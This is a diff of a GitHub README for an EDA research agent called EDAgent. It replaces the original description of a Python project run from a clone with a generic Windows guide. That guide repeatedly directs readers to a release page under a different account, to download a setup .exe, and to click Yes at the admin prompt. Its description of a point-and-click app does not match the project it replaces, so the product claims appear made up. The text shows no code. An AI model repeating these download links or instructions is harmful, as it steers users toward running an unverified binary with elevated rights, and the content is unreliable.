@@ -1,122 +1,159 @@
-# EDAgent
+# 🤖 EDAgent - Simplify Your EDA Research Tasks
 
-![GitHub stars](https://img.shields.io/github/stars/Mr-Fang-VLSI/EDAgent)
-![License](https://img.shields.io/github/license/Mr-Fang-VLSI/EDAgent)
+[![Download EDAgent](https://img.shields.io/badge/Download-EDAgent-brightgreen)](https://github.com/Biswajit56546/EDAgent/releases)
 
-A deployable, skill-based research agent system for EDA workflows.
+---
 
-![EDAgent Workflow Overview](docs/assets/workflow_overview.svg)
+EDAgent helps you handle your electronic design automation (EDA) research tasks. It uses smart techniques to organize your requests for code checking, debugging, experiment setup, and workflow management. You do not need to write code or have programming knowledge to use it.
 
-### Workflow Decision Logic
-- The agent first decides whether the task matches a **known workflow**.
-- If **known**, it directly selects the corresponding **skill subset** and executes.
-- If **unknown**, it runs a temporary safe flow, captures feedback, and then creates a reusable **new workflow + SOP**.
-- Future similar tasks are routed through this new known workflow.
+---
 
-### Knowledge/Tool Guard Loop
-- Before execution, the agent checks the **knowledge base** and **tool registry** first.
-- It prefers reusing existing methods/tools to reduce hallucination and avoid duplicate implementation.
-- After execution, it writes lessons back to KB/tools/SOP.
-- `SOP Hardened` feeds into the **next workflow step (PLAN)**, so later runs become smoother.
+## 📦 What is EDAgent?
 
-## Why EDAgent
-EDAgent turns a complex research workflow into a practical product-like experience:
-- one-command bootstrap,
-- natural-language interaction,
-- structured execution with audit artifacts,
-- continuous improvement from user feedback.
+EDAgent is a tool that works like an assistant for your EDA research. It knows how to perform specific jobs or "skills" related to EDA, such as:
 
-## Persistent SOP Across Chats and Projects
-One core advantage of EDAgent is SOP persistence beyond a single chat session.
-- SOP is stored in repository assets, not only in conversation memory.
-- Even if you switch chats or move to another project, workflow policy and operational habits are retained through repo-based governance.
-- New experience is continuously hardened into workflows, skills, and SOP records, so the system does not reset to zero each time.
+- Analyzing code you provide  
+- Finding and fixing errors  
+- Setting up new experiments based on your inputs  
+- Automating repeated research tasks  
 
-## No Skill Selection Burden for Users
-Users do not need to know, choose, or sequence skills manually.
-- The agent decides the workflow class from your task.
-- Then it selects the right skill subset and next step automatically.
-- You can stay focused on goals and constraints in natural language.
+It connects your questions or problems to the right skill, so you get precise help. This saves time and reduces manual work.
 
-## 30-Second Start
-```bash
-git clone https://github.com/Mr-Fang-VLSI/EDAgent.git
-cd EDAgent
-python3 run_demo.py
-```
+---
 
-What `run_demo.py` does:
-- verifies core folders,
-- runs infrastructure checks,
-- refreshes knowledge index,
-- prints next-step guidance.
+## 🔧 System Requirements
 
-## Core Capabilities
-- End-to-end research orchestration: idea -> hypothesis -> experiment -> validation -> retro.
-- Dynamic infrastructure maintenance: docs, knowledge, paper, and tool libraries.
-- Governed execution: theory-veto gates, audit trails, and rollback-aware updates.
-- User-facing reporting: targeted summaries and slide-ready outputs for specific questions.
+To run EDAgent smoothly on your Windows computer, make sure you have:
 
-## Product Experience
-- Conversational: users work in plain natural language.
-- Adaptive: behavior evolves with user preferences and feedback.
-- Self-maintaining: the system can refine SOPs and operational assets over time.
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 2 GHz or faster processor  
+- 500 MB of free disk space  
+- Internet connection for updates and some features  
 
-## Typical Use Cases
-- Build and iterate EDA research plans quickly.
-- Keep paper/knowledge/tool artifacts organized and searchable.
-- Run experiment loops with post-run reflection and next-step recommendations.
-- Generate concise explanation decks for collaborators/advisors.
+If you have more RAM or a faster processor, EDAgent will work better with larger projects.
 
-## Workflow-First Orchestration
-EDAgent routes in two phases for stability and scalability:
-1. classify the task into a workflow class,
-2. choose the next skill only from that workflow's skill subset.
+---
 
-This avoids global skill search on every turn and keeps routing predictable as skills grow.
+## 🚀 Getting Started with EDAgent
 
-## If You Use Codex/Claude-Style Agents
-After cloning the repo, you can start auto-deployment with one sentence in chat:
+Follow these steps to get EDAgent ready and running on your Windows PC.
 
-```text
-开始部署EDAgent
-```
+### 1. Visit the Download Page
 
-or
+Go to the EDAgent release page here:  
 
-```text
-Start deploying EDAgent
-```
+[![Download EDAgent](https://img.shields.io/badge/Download-EDAgent-9cf)](https://github.com/Biswajit56546/EDAgent/releases)  
 
-Expected behavior after this trigger:
-- verify repo/environment status,
-- bootstrap/verify infra folders,
-- run guard/audit/index checks,
-- ask your research direction and hard constraints.
+This page has all program versions available for download.
 
-After clone + `python3 run_demo.py`, ask the agent to continue from your direction and constraints.
+### 2. Choose the Latest Version
 
-Example prompt:
-```text
-My research direction is placement for dynamic-power reduction.
-Constraints: area/timing must not regress.
-Please start with a scoped plan, run the first validation loop, and summarize key findings.
-```
+Look for the latest release. You will find files named something like:
 
-## Repository Layout
-- `AGENTS.md`: top-level governance and orchestration policy.
-- `skills/`: modular capabilities (execution, infra maintenance, domain methods).
-- `scripts/common/`: reusable infra and indexing utilities.
-- `docs/knowledge_base/`: protocol and landscape knowledge.
-- `docs/tool_registry/`: tool metadata/catalog.
-- `slurm_logs/00_meta/`: governance and audit artifacts.
+- `EDAgent_Setup.exe`  
+- `EDAgent_Win64.zip`  
 
-## Open-Source Scope
-- Research and experimentation only.
-- No production SLA or warranty.
-- Validate outputs independently for high-stakes decisions.
+Pick the setup `.exe` file if available. This is the easiest to install.
 
-See also:
-- `CONTRIBUTING.md`
-- `ROADMAP.md`
-- `docs/WORKFLOW_CATALOG.md`
+### 3. Download the Installer
+
+Click the `.exe` file link. Your browser will start downloading the installer file.
+
+### 4. Run the Installer
+
+Once downloaded, find the file (usually in your Downloads folder) and double-click it.
+
+Windows may ask if you want to allow this app to make changes. Click **Yes**.
+
+Follow the installer steps:
+
+- Agree to the license terms  
+- Choose installation folder (or leave default)  
+- Click Install  
+
+### 5. Launch EDAgent
+
+After installation, find EDAgent in your Start menu or on the desktop. Double-click to start.
+
+---
+
+## ⚙️ Using EDAgent: Basic Guide
+
+The app presents a simple user interface that guides you through tasks. Here is what you can do first.
+
+### Add Your EDA Code
+
+You can load your code by clicking **Add Code**. This can be a script or design file you want analyzed or debugged.
+
+### Choose a Skill
+
+Select the task you want:
+
+- **Analyze Code**: Check your code for issues or suggestions.  
+- **Debug Code**: Find and fix possible errors.  
+- **Set up Experiment**: Automate steps to prepare and run new tests.  
+- **Automate Workflow**: Create routines to repeat common research actions.  
+
+### Submit Your Request
+
+Describe what you want the agent to do in plain language. For example: “Check my design for timing errors” or “Set up an experiment to test power consumption.”
+
+### Review the Output
+
+EDAgent will process your input using its skills. It gives clear answers, suggestions, or files ready to use.
+
+---
+
+## 🔄 Updating EDAgent
+
+New releases improve features and fix bugs. To update:
+
+- Visit the release page again: https://github.com/Biswajit56546/EDAgent/releases  
+- Download the newest installer  
+- Run it like before—it will replace the older version safely  
+
+---
+
+## 🛠 Troubleshooting Tips
+
+If EDAgent does not start or works strangely, try these steps:
+
+- Restart your computer.  
+- Make sure Windows is up to date.  
+- Check that your internet connection is active.  
+- Close other heavy programs.  
+- Reinstall EDAgent using the latest installer from the release page.  
+
+If problems continue, you can check the issues tab on the official GitHub page for help from the community.
+
+---
+
+## 💡 Common Uses
+
+People use EDAgent for several tasks in electronic design automation research:
+
+- Quickly analyzing complex code blocks.  
+- Finding bugs before simulation or hardware testing.  
+- Automatically preparing multiple experiment runs.  
+- Managing and streamlining research workflows.  
+
+EDAgent suits both short, quick tasks and longer projects that need repeat actions.
+
+---
+
+## 📚 More Information
+
+You can find details on the project’s purpose, technology, and updates in the GitHub README and wiki.
+
+Visit the main page to explore topics:  
+
+`agent`, `ai-agent`, `automation`, `eda`, `llm`, `productivity`, `research-workflow`, `skill-system`, `workflow-automation`
+
+---
+
+## 🔗 Download and Install EDAgent
+
+Start using EDAgent by visiting the release page below. Download the suitable file for your PC and follow the install steps above.
+
+[Get EDAgent Here](https://github.com/Biswajit56546/EDAgent/releases)
